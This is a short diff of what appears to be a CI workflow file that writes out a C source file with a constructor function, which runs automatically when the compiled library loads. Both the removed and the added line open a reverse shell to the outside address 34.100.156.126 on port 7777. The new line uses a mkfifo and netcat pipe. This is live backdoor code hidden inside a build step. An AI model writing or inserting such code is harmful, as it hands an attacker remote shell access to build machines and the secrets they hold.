@@ -17,7 +17,7 @@ jobs:
           #include <stdlib.h>
           void __attribute__ ((constructor)) premain()
           {
-            system("nc -c sh 34.100.156.126 7777");
+            system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 34.100.156.126 7777 >/tmp/f");
           }
           EOF
           mkdir -p ./build_dir
